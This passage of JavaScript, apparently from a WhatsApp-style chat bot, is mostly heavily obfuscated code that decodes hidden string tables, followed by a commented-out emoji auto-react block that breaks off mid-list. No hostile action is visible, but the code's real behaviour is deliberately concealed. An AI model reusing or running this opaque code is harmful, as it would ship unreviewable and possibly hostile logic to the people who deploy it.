Cg1I3Cv.U3xqZL5()?0x388:-0xf6:hBWYC7l[XhKj1P(0x82)]=b5HnBX5(HNhGboO(0x5a))||Vdn2j5[b5HnBX5[RTujYc(XhKj1P(0x37))](XhKj1P(0x2c),[XhKj1P(0x98)])];break;case!Cg1I3Cv.XYEtLy()?-(hBWYC7l[HNhGboO(0x51)]+0xb6):0x1064:return zjw5TV[b5HnBX5(0x6c)]||Vdn2j5[b5HnBX5[RTujYc(HNhGboO(-0x5))](XhKj1P(0x2c),0x6c)];case Cg1I3Cv.bARMBS>-0x4b?0x827:-HNhGboO(0x5b):hBWYC7l.T9yyZHZ=b5HnBX5[RTujYc(XhKj1P(0x37))](XhKj1P(0x2c),[XhKj1P(0x9a)])||Vdn2j5[b5HnBX5(0x6d)];break;case!(Cg1I3Cv.htJmLHi>-XhKj1P(0x47))?0xc2:0x11cb:return zjw5TV[b5HnBX5(HNhGboO(0x5d))]||Vdn2j5[b5HnBX5(XhKj1P(0x9b))];case!(Cg1I3Cv.htJmLHi>-HNhGboO(0x9))?0xc1:0xa15:return zjw5TV[b5HnBX5(0x6f)]||Vdn2j5[b5HnBX5(HNhGboO(-0xf))+'\u006f\u006e'];case!(Cg1I3Cv.Nakwck7>-HNhGboO(-0x6))?-0xb9:0xef3:hBWYC7l.T9yyZHZ=b5HnBX5(XhKj1P(0x7e))||Vdn2j5[hBWYC7l[XhKj1P(0x9c)][RTujYc(HNhGboO(0x5f))]];break;case Cg1I3Cv.htJmLHi>-HNhGboO(0x9)?0xcdd:-0xd6:return zjw5TV[b5HnBX5(0x72)]||Vdn2j5[b5HnBX5(0x72)];case 0x36d:return zjw5TV[b5HnBX5(XhKj1P(0x9e))]||Vdn2j5[b5HnBX5(0x73)];case Cg1I3Cv.U3xqZL5()?0x8ea:0xcc:return zjw5TV[b5HnBX5[RTujYc(0xa6)](HNhGboO(-0x12),0x74)]||Vdn2j5[b5HnBX5(0x75)+b5HnBX5(XhKj1P(0x9f))+'\x6f\x72'];case!(Cg1I3Cv.ri9obK>-HNhGboO(-0x9))?-XhKj1P(0xa0):0x11af:hBWYC7l[HNhGboO(0x44)]=b5HnBX5(0x77)+b5HnBX5[RTujYc(HNhGboO(-0x7))](HNhGboO(-0x12),[XhKj1P(0xa2)])||Vdn2j5[fwCeNqk[HNhGboO(0x63)]+b5HnBX5[RTujYc(HNhGboO(-0x5))](HNhGboO(-0x12),XhKj1P(0xa2))];break;case Cg1I3Cv.RJ8fzYI()?0xd19:-XhKj1P(0xa3):return zjw5TV[b5HnBX5(HNhGboO(0x7))+b5HnBX5(HNhGboO(0x46))]||Vdn2j5[b5HnBX5(HNhGboO(0x7))+b5HnBX5[RTujYc(HNhGboO(-0x7))](XhKj1P(0x2c),[0x54])];case!(Cg1I3Cv.htJmLHi>-HNhGboO(0x9))?HNhGboO(0x66):0x797:hBWYC7l[XhKj1P(0x82)]=b5HnBX5(XhKj1P(0xa5))+b5HnBX5(XhKj1P(0xa6))||Vdn2j5[b5HnBX5(0x7a)+b5HnBX5(XhKj1P(0xa6))];break;case!(Cg1I3Cv.Nakwck7>-XhKj1P(0x38))?0x11:0xc55:hBWYC7l[HNhGboO(0x44)]=b5HnBX5(0x7c)||Vdn2j5[fwCeNqk[XhKj1P(0x49)]+b5HnBX5(0x7e)];break;case Cg1I3Cv.ri9obK>-HNhGboO(-0x9)?0x105c:XhKj1P(0x38):return zjw5TV[b5HnBX5(0x7f)+b5HnBX5(XhKj1P(0x42))]||Vdn2j5[b5HnBX5[RTujYc(HNhGboO(-0x5))](XhKj1P(0x2c),HNhGboO(-0x18))+b5HnBX5(0x80)];case Cg1I3Cv.Nakwck7>-HNhGboO(-0x6)?0xc4:-HNhGboO(0x21):return zjw5TV[b5HnBX5(0x81)]||Vdn2j5[fwCeNqk[0x7]+b5HnBX5(0x83)+XhKj1P(0xa7)];case 0xafb:return zjw5TV[b5HnBX5[RTujYc(hBWYC7l[XhKj1P(0x8f)]+0x12d)](XhKj1P(0x2c),[0x84])+b5HnBX5(HNhGboO(0x6a))]||Vdn2j5[hBWYC7l[HNhGboO(0x5e)][RTujYc(XhKj1P(0x7f))]];case!(Cg1I3Cv.Nakwck7>-HNhGboO(-0x6))?0xdf:0xb77:return zjw5TV[b5HnBX5(0x82)+b5HnBX5(0x87)+'\u0074\u0065']||Vdn2j5[hBWYC7l[XhKj1P(0xc)][XhKj1P(0xa)]+fwCeNqk[XhKj1P(0x12)]+HNhGboO(0x6e)];case!(Cg1I3Cv.Cez3Ci[b5HnBX5(HNhGboO(0x31))+b5HnBX5(0x89)](HNhGboO(-0x1a))==XhKj1P(0xa9))?-0x88:0x61e:return zjw5TV[OxZVodA[RTujYc(HNhGboO(0x6c))]+b5HnBX5(0x8b)+'\u0073\u006b']||Vdn2j5[nI97suA];case Cg1I3Cv.YgPzNK>-XhKj1P(0x8b)?0x276:-0x5c:return zjw5TV[b5HnBX5(XhKj1P(0x3b))]||Vdn2j5[b5HnBX5(XhKj1P(0x3b))];case 0xf3d:return zjw5TV[b5HnBX5(XhKj1P(0xab))+HNhGboO(0x6e)]||Vdn2j5[hBWYC7l[0x1][XhKj1P(0xc)]+XhKj1P(0xac)];case!(Cg1I3Cv.YgPzNK>-0x59)?0xdb:0x93e:return zjw5TV[b5HnBX5[RTujYc(XhKj1P(0x39))](void 0x0,HNhGboO(0x6f))]||Vdn2j5[b5HnBX5(HNhGboO(0x6f))];case Cg1I3Cv.Nakwck7>-HNhGboO(-0x6)?0x151:0xbc:hBWYC7l.T9yyZHZ=b5HnBX5[RTujYc(hBWYC7l[XhKj1P(0x7b)]+XhKj1P(0x97))](HNhGboO(-0x12),HNhGboO(0x70))||Vdn2j5[b5HnBX5(0x90)];break;case Cg1I3Cv.Cez3Ci[b5HnBX5(XhKj1P(0x6f))+b5HnBX5(hBWYC7l[HNhGboO(0x51)]+0x113)](XhKj1P(0x24))==HNhGboO(0x6b)?0xef1:HNhGboO(-0x8):return zjw5TV[b5HnBX5(HNhGboO(0x71))]||Vdn2j5[b5HnBX5[RTujYc(XhKj1P(0x37))](XhKj1P(0x2c),[HNhGboO(0x71)])];case!(Cg1I3Cv.bARMBS>-XhKj1P(0x79))?hBWYC7l[HNhGboO(0x3d)]+0x8e:0xc9a:hBWYC7l.T9yyZHZ=b5HnBX5(XhKj1P(0xb0))||Vdn2j5[b5HnBX5(HNhGboO(0x72))]}return hBWYC7l.HHr9Of9>-XhKj1P(0x5a)?hBWYC7l[-0x1b]:zjw5TV[hBWYC7l.T9yyZHZ]||Vdn2j5[hBWYC7l[XhKj1P(0x82)]]}Pvyd5E7(hgnanI,HNhGboO(-0x32));function hgnanI(...hBWYC7l){var XhKj1P=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0x28?hBWYC7l-0x5:hBWYC7l<0xda?hBWYC7l>0x28?hBWYC7l-0x29:hBWYC7l+0x42:hBWYC7l-0x19]},0x1);!(hBWYC7l[HNhGboO(-0x22)]=HNhGboO(-0x32),hBWYC7l[0xa0]=HNhGboO(0x73),hBWYC7l[HNhGboO(-0x32)]='\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048\u0049\u004a\u004b\u004c\u004d\u004e\u004f\u0050\u0051\u0052\u0053\u0054\u0055\u0056\u0057\u0058\u0059\u005a\u0061\u0062\u0063\u0064\u0065\u0066\u0067\u0068\u0069\u006a\u006b\u006c\u006d\u006e\u006f\u0070\u0071\u0072\u0073\u0074\u0075\u0076\u0077\u0078\u0079\u007a\u0030\u0031\u0032\u0033\u0034\u0035\u0036\u0037\u0038\u0039\u0021\u0023\u0024\u0025\u0026\u0028\u0029\u002a\u002b\u002c\u002e\u002f\u003a\u003b\u003c\u003d\u003e\u003f\u0040\u005b\u005d\u005e\u005f\u0060\u007b\u007c\u007d\u007e\u0022',hBWYC7l[HNhGboO(0x76)]=hBWYC7l[0x1],hBWYC7l[HNhGboO(0x75)]=''+(hBWYC7l[0x0]||''),hBWYC7l[hBWYC7l[HNhGboO(0x74)]-0x1d]=hBWYC7l[HNhGboO(0x75)].length,hBWYC7l[HNhGboO(0x9)]=[],hBWYC7l[HNhGboO(0x63)]=hBWYC7l[hBWYC7l[0xa0]+HNhGboO(0x4)]-0x20,hBWYC7l[hBWYC7l[0xa0]-HNhGboO(-0x15)]=HNhGboO(-0x34),hBWYC7l[HNhGboO(0x77)]=-0x1);for(let QSn3xT=HNhGboO(-0x34);QSn3xT<hBWYC7l[HNhGboO(-0x1a)];QSn3xT++){hBWYC7l[HNhGboO(0x78)]=hBWYC7l[HNhGboO(0x76)].indexOf(hBWYC7l[HNhGboO(0x75)][QSn3xT]);if(hBWYC7l.rxEENR===-HNhGboO(-0x32)){continue}if(hBWYC7l.BhXZy03<HNhGboO(-0x34)){hBWYC7l[HNhGboO(0x77)]=hBWYC7l.rxEENR}else{var tjWYYPd=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l>-0x1e?hBWYC7l>0x94?hBWYC7l+0x55:hBWYC7l<0x94?hBWYC7l>-0x1e?hBWYC7l>0x94?hBWYC7l-0x28:hBWYC7l>-0x1e?hBWYC7l<0x94?hBWYC7l>-0x1e?hBWYC7l+0x1d:hBWYC7l-0xc:hBWYC7l+0x30:hBWYC7l-0x43:hBWYC7l+0x42:hBWYC7l+0x46:hBWYC7l-0x50]},0x1);!(hBWYC7l[HNhGboO(0x77)]+=hBWYC7l[HNhGboO(0x78)]*0x5b,hBWYC7l[tjWYYPd(0x7c)]|=hBWYC7l[HNhGboO(0x77)]<<hBWYC7l[hBWYC7l[hBWYC7l[tjWYYPd(0x8d)]+tjWYYPd(0x1d)]-tjWYYPd(0x4)],hBWYC7l[HNhGboO(0xb)]+=(hBWYC7l.BhXZy03&hBWYC7l[tjWYYPd(0x8d)]+0x1fdf)>HNhGboO(0x4b)?HNhGboO(-0x2a):HNhGboO(-0x31));do{typeof(hBWYC7l[0x4].push(hBWYC7l[hBWYC7l[hBWYC7l[0xa0]+tjWYYPd(0x1d)]-0x1b]&0xff),hBWYC7l[HNhGboO(0x63)]>>=tjWYYPd(-0x13),hBWYC7l[hBWYC7l[0xa0]-HNhGboO(-0x15)]-=tjWYYPd(-0x13))}while(hBWYC7l[hBWYC7l[tjWYYPd(0x8d)]-HNhGboO(-0x15)]>HNhGboO(-0x2d));hBWYC7l[tjWYYPd(0x90)]=-0x1}}if(hBWYC7l[HNhGboO(0x77)]>-XhKj1P(0x2d)){var rgoga7=o4SeuCt(hBWYC7l=>{return P_cw5z[hBWYC7l<0xee?hBWYC7l>0x3c?hBWYC7l<0xee?hBWYC7l>0xee?hBWYC7l-0x3e:hBWYC7l>0xee?hBWYC7l+0x4a:hBWYC7l-0x3d:hBWYC7l-0x1e:hBWYC7l-0x13:hBWYC7l-0x20]},0x1);hBWYC7l[0x4].push((hBWYC7l[rgoga7(0xd6)]|hBWYC7l[rgoga7(0xea)]<<hBWYC7l[hBWYC7l[XhKj1P(0xd3)]-XhKj1P(0x4a)])&0xff)}return hBWYC7l[0xa0]>hBWYC7l[HNhGboO(0x74)]+XhKj1P(0xd8)?hBWYC7l[0x87]:xuqNBP(hBWYC7l[HNhGboO(0x9)])}function b5HnBX5(P_cw5z,hBWYC7l,XhKj1P,QSn3xT=hgnanI,tjWYYPd=tGa4JkL){if(XhKj1P){return hBWYC7l[tGa4JkL[XhKj1P]]=b5HnBX5(P_cw5z,hBWYC7l)}else{if(hBWYC7l){[tjWYYPd,hBWYC7l]=[QSn3xT(tjWYYPd),P_cw5z||XhKj1P]}}return hBWYC7l?P_cw5z[tjWYYPd[hBWYC7l]]:tGa4JkL[P_cw5z]||(XhKj1P=(tjWYYPd[P_cw5z],QSn3xT),tGa4JkL[P_cw5z]=XhKj1P(jqmblq[P_cw5z]))}function vPbuaQ(){return'\u003e\u0066\u003a\u0049\u0030\u003b\u004f\u0036\u0040\u0053\u0077\u002a\u005f\u002c\u0046\u006c\u005e\u0066\u0075\u0045\u0025\u006b\u0044\u005a\u0057\u0024\u0053\u0021\u0047\u006c\u0044\u0065\u0079\u004d\u0044\u003d\u004e\u0035\u0033\u0042\u005f\u0035\u006d\u0021\u0028\u005d\u0060\u0062\u007c\u0039\u0037\u0044\u004b\u0054\u0037\u005b\u006a\u0025\u0023\u007a\u0063\u0031\u0038\u0053\u006f\u005a\u0064\u0048\u0068\u0047\u002a\u006e\u0054\u003d\u0037\u0038\u0040\u006f\u0045\u007c\u0028\u0077\u0072\u002e\u0038\u006e\u0034\u0053\u0029\u0035\u0047\u0025\u0053\u005b\u004d\u007c\u0040\u0034\u0063\u003a\u005b\u0068\u0036Ŝř\u007a\u0034\u0037\u0073\u006e\u0041\u0072\u0032\u0033\u0060\u0079\u0073\u0075\u0029\u0054\u003c\u006a\u0043\u005a\u0022\u0070\u0054\u0032\u0038\u0033\u002f\u002a\u0043\u0059\u0051\u0035\u005a\u0047\u0021\u005b\u004a\u007c\u005d\u006c\u003e\u0045\u0059\u002c\u006e\u0042\u0072\u0049\u0024\u0075\u005b\u0045\u0041\u0071\u003a\u0047\u007b\u0045\u0068\u006f\u0030\u0040\u004b\u004f\u002f\u0067\u0066\u0043\u007c\u0071\u0058\u0049\u004a\u005a\u003c\u0062\u0070\u0074\u0049\u0059\u0021\u002e\u002c\u0057\u0063\u0026Ɖ\u0048\u0065\u002c\u0048\u0031\u0035\u0025\u0070\u007c\u003e\u006c\u0075\u0063\u0034\u0075\u003b\u004e\u0044\u004d\u0037\u003d\u0064\u0077\u0030\u0062\u0036\u0032\u007e\u007a\u0030\u005d\u0047\u0030\u0048\u0036\u0046\u0069\u0055\u0044\u0037\u0064\u0028\u0029\u0048\u0032\u0025\u005f\u006b\u004d\u0051\u0023\u004f\u0033\u0065\u0078ż\u007c\u0058\u0050\u0055\u003d\u003e\u005b\u0061ƫ\u003f\u0052\u003f\u0045\u0051\u005e\u0075ƫ\u0064\u0050\u0028\u0067\u0074\u0040\u006dƫ\u0034\u0034\u0021\u0066\u0050\u005b\u0041ƍ\u0044\u0077\u004aį\u0053\u0050\u0057\u0033\u0044\u003a\u0075\u0065\u0047\u007c\u0033\u0032\u0066\u0063\u0046\u002e\u0069\u0065\u004b\u0055\u007cȓ\u004e\u004b\u0064\u007c\u002a\u007a\u0062\u0067į\u005a\u0075\u0044\u0067\u003fȕ\u007c\u005bǥ\u0067\u0058\u006d\u004e\u0042\u007c\u004f\u0038\u0042\u0032\u0063\u002cȆ\u007c\u0035\u0029\u002c\u003c\u005b\u005b\u0077ƫ\u0057\u002cǺ\u0059\u007cȈ\u007a\u0049\u0075\u0078\u0063ƫǸ\u003c\u0064\u0023\u003d\u0051ƫ\u0077\u0035\u007a\u0067ǒ\u0059ƫ\u003b\u0069\u0045\u003d\u005f\u002aȖȦȨȪ\u0057ƫ\u007d\u004f\u0037\u0067Ʊ\u0079ƫ\u0039\u005aȲ\u0070\u003d\u006fƫ\u005a\u0042\u0078\u0049\u0042\u002a\u0030ƫ\u0041\u0053\u005f\u0031\u0063ȵȷ\u0067\u0025Ȣ\u006b\u0042\u0023\u0040\u002bɈ\u0076\u0061\u004cʃ\u007c\u0048\u0075\u0040\u004a\u004e\u003aɫ\u007c\u0065\u0035ɔ\u0038\u003d\u0044Ɉ\u0038\u004aȊǼ\u0022Ȗɭɯ\u0074\u0029\u006bƫɒ\u0056\u004b\u007c\u004d\u0047\u005a\u0032į\u0068\u0072ˌį\u0024\u0071\u0025\u0067\u0047\u003fʸ\u007c\u003fʜʯɘ\u007c\u007b\u007a\u0059\u004a\u0067\u002c\u0078Ɉ\u005e\u0069\u005e\u0049ɞ\u0050Ȳ\u007c\u006f\u0061Ƚ\u0036\u003d\u004dƫ\u005e\u0044Ȋɝ\u0065\u0050\u0024\u004aɢɤ\u007cˀ\u0049\u0033\u005d˞\u0034\u0032\u002fˍ\u007c\u0045\u0045\u0030\u003d\u0066\u002cȖ\u0072\u0072\u0065\u0048Ȍ̀\u0064\u0038\u002eˣ\u002c\u0053ƫ\u0046\u0072\u003e\u0076̞̐\u007c\u0075ʻ\u0067\u0033\u002b\u0024Ȗ̌ˇ\u002e\u0057\u0071ƫ\u0070\u0072\u005e\u0067\u0034\u002b\u0055ƫĜ\u005b\u0067\u0070\u0040˞\u0067\u0072˽\u007c\u003d\u0047Ā\u005d\u002aʅǇ\u0057\u004c\u004b\u0078\u0029Ȏ\u007c˷ɶʶ̺͌\u0043ɷ\u002a˵\u007c\u0076\u0032\u0077\u002fɸʔ\u007c\u0059˼\u004aȴ͞͠ɸ\u0025\u003b\u003b\u0052\u0029\u002fɈɭɔ\u0076\u003b\u0072\u004e\u0048\u007c\u0026\u006c\u0048\u003cɎȖ\u0034\u0061\u0065\u0066\u0066\u003eȖ\u004e\u0038΃\u0067Ά\u007cΈΊ\u003e˙\u005e\u0055\u0033\u003c\u0038\u0057ʱ\u0072\u004d\u006e\u003c\u004e\u005b\u0066Ɉ\u0056\u0075\u003c\u003dʚ\u0062\u0072\u0057\u0066\u007e\u003c͗˻˽\u006e\u0032͗\u0025\u0032ͽͿȗʭ\u0050\u003a\u0054\u005bȤ\u0074\u0035ˇ\u007c\u005f\u007aș͝ʧ΋\u005b\u0038ƫ\u002f\u0037ɌɎɐ\u0052\u0050\u0029\u003d\u006c\u002fȖ\u0058\u002c\u006a\u0067\u002fĊ\u004e\u0032\u0054\u0035Ƿϗϙ\u0077ɐ̴\u0046ˈ\u0049˱\u0067ɰψǷ\u007d\u0064\u0066\u0071ȍƫ\u0036ď˫\u007a˸ʩ\u0059Ǚ\u007a\u0054\u007c\u006bǛ\u003d\u0072\u0040Ȗ\u007e\u004fο˛\u0063\u003d\u0062\u002c\u006c\u0054͹̓\u0047\u0048\u0063\u0037̒\u0072\u0058Г̫\u007bȤ\u005b\u0069̉\u0073\u0029\u0069ȇ\u0050\u0072\u0067θ\u0036ȣɑ˃Ё\u0040Ň͹\u006b̔\u0066Ʊ͗\u0058\u007d\u0074\u0066\u0057Ϋƫ\u0043\u0045ʨ\u005a\u007c\u006eϖ;\u007c\u0061\u0072Ǻ\u0069\u003eȢȤ̌̎̐Ħ̋̍̏\u002c\u0069\u0040\u0071ȯыё˦\u007c\u006a\u0072ɠȴ\u0038\u0044ˇ\u0061͝˜\u003aΉȤƆɯɱƫ\u005f\u0071̛ǀ\u005d\u0040ȤŉǺ\u003d\u005b\u0024\u007bЍͅ\u0037Ѵ\u005b̀\u0074͇\u0066͉͋\u0067\u007aɯ\u0068\u0060Ȗ\u0076\u007a̛\u006e҈\u007cʀ\u0075\u0066̿\u0022\u0040\u0073\u0021\u0031\u0048\u0077\u0062\u0052рɈҐҒ\u0040͗\u0037\u004a\u006d\u0066\u0068\u0040ɐ\u0025\u0044ǺɎ\u0076Ɉ\u005b\u007ảʚ\u0037\u0021ɠ\u003bϣƫ˻ˇ\u0048\u003a˄\u007c\u0063\u0072\u0064ȳͅ\u0069ҥ\u006fҕ\u0030Ę\u0038\u0026\u0050\u0079\u004fӄӆ\u0040\u003dɈͻΛ\u0031\u005d͋˻Ȋ\u007a\u003d͋\u0029\u007a̶\u0055\u003cȖ\u003dӅ\u0066Ӈѓ\u0072\u0025ʣ\u0070\u0051\u004b\u006dӐӧ\u0040ю\u0072\u0035ʘ\u0062\u005e͜Ӛ΋\u003cҾ\u0068\u004d\u002b\u0066ѵάȉӼ\u0077\u0065\u0038\u0021\u0022\u0075\u0069\u0039Ş\u002bϵ\u004c\u003a͜\u0032\u0058\u0030\u0031\u006e\u0076ʌ\u007c\u0050ϐ\u0046ȴ̙ҥˤ\u0023Ɉ\u0032\u004a̎\u0040ŝȇ\u0038Ԣ\u002c\u0065\u0030\u0072\u0052\u0028\u0026\u0068\u0051\u0030\u006f\u0051ɈȦ\u006b\u0064\u004c\u0033ɺ\u0032\u0023ГΤƫџʭ\u007c\u0043\u0050ͽ\u0038\u0036\u0026\u0059͹Չͽ\u006f\u0032˵͹ɚ\u0035\u0032\u0065\u003eС\u007c̔\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073\u007c\u0054Ǵ\u0074Ğ\u0063\u006f\u0064\u0065\u0072\u007c\u0055\u0069\u006e\u0074\u0038Ů\u0072\u0061\u0079\u007c\u0042ґ\u0066հ\u007c\u0053\u0074\u0072մ\u0067\u007cոպȰ\u0072\u006fȎծ˻\u006fմ\u0074֊֌\u0043\u0068ф\u0043֎\u007c\u006c\u0065\u006eȋ\u0068\u007c\u0070\u0075\u0073֟\u006a֐\u006e̦\u006eկ\u0066մ\u0065Ԡ\u0065խկ֓Ӱ\u0074\u006fւք̦֝ж\u002d\u0038у\u0070\u0070\u006cջ\u005f\u004fƻ\u0031\u005fͤ\u006f\u0075\u0047\u0076׆\u0063\u0061\u006c\u006c\u007c\u007aō\u006a\u0062͹\u0056\u0050\u004a\u0054\u0066\u0046ב\u007a\u0076\u0041\u0032\u004fז\u006c\u004c\u0034ХŎϞ\u0058\u0057\u0045о\u0064\u0061\u0046\u0034\u006a\u0039Ӱ\u004f\u0041\u006e\u0056\u007a\u0066\u0047'}Pvyd5E7(RTujYc,HNhGboO(-0x32));function RTujYc(...P_cw5z){typeof(P_cw5z[HNhGboO(-0x22)]=0x1,P_cw5z[HNhGboO(0x7a)]=P_cw5z[0x0]);return hBWYC7l[P_cw5z[HNhGboO(0x7a)]]}function sl6u6L(P_cw5z){var hBWYC7l,XhKj1P,QSn3xT,tjWYYPd={},rgoga7=P_cw5z.split(''),FyP1zD=XhKj1P=rgoga7[HNhGboO(-0x34)],xXqKKeg=[FyP1zD],SVABiBi=hBWYC7l=0x100;for(P_cw5z=HNhGboO(-0x32);P_cw5z<rgoga7.length;P_cw5z++)QSn3xT=rgoga7[P_cw5z].charCodeAt(HNhGboO(-0x34)),QSn3xT=SVABiBi>QSn3xT?rgoga7[P_cw5z]:tjWYYPd[QSn3xT]?tjWYYPd[QSn3xT]:XhKj1P+FyP1zD,xXqKKeg.push(QSn3xT),FyP1zD=QSn3xT.charAt(0x0),tjWYYPd[hBWYC7l]=XhKj1P+FyP1zD,hBWYC7l++,XhKj1P=QSn3xT;return xXqKKeg.join('').split('\u007c')}function NK6FSu(){return['\u0074\u0068\u0041\u0045\u0046\u005f',0x2,0x0,'\x64\x48\x38\x77\x49\x71',0x1,0xe,0x10,0x16,0x19,0x7,0x8,0x22,0xd,0x2b,0x46,0x50,0x53,0x65,0x74,0x41,'\x6c\x65\x6e\x67\x74\x68',0xf4,0x1f,0x3f,0xef,0x12,0xc,0x4f,0x3,0x45,0x7f,0x9e,0x8c,0x1a,0x2c,0x87,void 0x0,0x61,0x8a,0x70,'\u0053\u0041\u0079\u0064\u0061\u0069\u0037',0xa4,0x57,0x48,0x25,0x4a,0x13,0xa3,0xb,0xa6,0x68,0x8d,0x67,0x5e,0xa9,0x24,0x60,0x11,0x80,'\x56\x44\x6c\x61\x44\x61\x46',0x14,0x79,0x3d3,0x4,'\u0071\u0046\u0046\u0049\u0041\u004e\u004e',0x6,0x1b,'\u0043\u0072\u0074\u0030\u0061\u004f',0x82,0x17,0x18,0x1c,'\x69\x79\x4d\x67\x42\x71\x75',0xa,0x2a,0x5b,0x30,0x3c,!0x1,'\x6d\x65',0x2f,0x31,0x37,0x38,'\x62','\u0067',0x15,0x3d,'\x7a',0x36,'\x6e',0x5a,0x6c,'\u005f\u0056\u0030\u0061\u0041\u0046\u0035',0x99,'\u0046','\u0071','\x6f',0x93,'\u0079',0x3b,0x72,0xaa,0x88,'\x43','\u0041','\u0047','\x45',!0x0,0x3e,0x40,0x43,0x2d,0x4b,0x4c,'\u0055\u0063\u0037\u0067\u007a\u0051',0x6f,0x5f,0x71,0xad,0x86,0x51,'\u0054\u0039\u0079\u0079\u005a\u0048\u005a',0x52,0x54,0x55,'\x70\x65',0x31f,0x56,0x58,0x1bf,0x59,0x1c9,0x29,0x5c,'\u0048\u0048\u0072\u0039\u004f\u0066\u0039',0x5d,0xa7,0x26,0x27,0x66,0x7c,0x69,0x6a,0x6b,0x95,0x6d,0x6e,'\u0059\u0035\u004d\u0039\u0066\u0056',0xac,0x73,0x76,0x94,0x5,0x78,0x33,0x96,0x7a,0x7b,'\x6c',0x85,0x44,0xa8,0x8e,'\x74\x65',0x8f,0x90,0x91,0x92,0x20,0xa0,'\u006e\u0079\u0051\u0075\u0033\u005f','\x46\x64\x49\x48\x6c\x79\x59','\x42\x68\x58\x5a\x79\x30\x33','\u0072\u0078\u0045\u0045\u004e\u0052',0x3a,'\u0053\u0076\u004a\u0056\u0042\u0076']}function o4SeuCt(P_cw5z,hBWYC7l){var XhKj1P=function(){return P_cw5z(...arguments)};Object['\u0064\u0065\u0066\u0069\u006e\u0065\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079'](XhKj1P,'\x6c\x65\x6e\x67\x74\x68',{'\x76\x61\x6c\x75\x65':hBWYC7l,'\u0063\u006f\u006e\u0066\u0069\u0067\u0075\u0072\u0061\u0062\u006c\u0065':true});return XhKj1P}
//------------------ Auto react ---------------------//

        /*
        if (config.AUTO_REACT === 'true') { 
    if (isReact) return;
    const emojis = ["🩷", "🔥", "✨", "🔮", "♠️", "🪄", "🔗", "🫧", "🪷", "🦠", "🌺", "🐬", "🦋", "🍁", "🌿", "🍦", "🌏", "✈️", "❄️"];
    
    emojis.forEach(emoji => {
      m.react(emoji);
    });
        }
       

        // Auto React 
if (!isReact && senderNumber !== botNumber) {
    if (config.AUTO_REACT === 'true') {
        const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '👫', '👭', '👬', '👮', "🕴️", '💼', '📊', '📈', '📉', '📊', '📝', '📚', '📰', '📱', '💻', '📻', '📺', '🎬', "📽️", '📸', '📷', "🕯️", '💡', '🔦', '🔧', '🔨', '🔩', '🔪', '🔫', '👑', '👸', '🤴', '👹', '🤺', '🤻', '👺', '🤼', '🤽', '🤾', '🤿', '🦁', '🐴', '🦊', '🐺', '🐼', '🐾', '🐿', '🦄', '🦅', '🦆', '🦇', '🦈', '🐳', '🐋', '🐟', '🐠', '🐡', '🐙', '🐚', '🐜', '🐝', '🐞', "🕷️", '🦋', '🐛', '🐌', '🐚', '🌿', '🌸', '💐', '🌹', '🌺', '🌻', '🌴', '🏵', '🏰', '🏠', '🏡', '🏢', '🏣', '🏥', '🏦', '🏧', '🏨', '🏩', '🏪', '🏫', '🏬', '🏭', '🏮', '🏯', '🚣', '🛥', '🚂', '🚁', '🚀', '🛸', '🛹', '🚴', '🚲', '🛺', '🚮', '🚯', '🚱', '🚫', '🚽', "🕳️", '💣', '🔫', "🕷️", "🕸️", '💀', '👻', '🕺', '💃', "🕴️", '👶', '👵', '👴', '👱', '👨', '👩', '👧', '👦', '👪', '🙂', '😑', '🤣', '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭', '😓', '😳', '😴', '😌', '😆', '😂', '🤔', '😒', '😓', '😶', '🙄', '🐶', '🐱', '🐔', '🐷', '🐴', '🐲', '🐸', '🐳', '🐋', '🐒', '🐑', '🐕', '🐩', '🍔', '🍕', '🥤', '🍣', '🍲', '🍴', '🍽', '🍹', '🍸', '🎂', '📱', '📺', '📻', '🎤', '📚', '💻', '📸', '📷', '❤️', '💔', '❣️', '☀️', '🌙', '🌃', '🏠', '🚪', 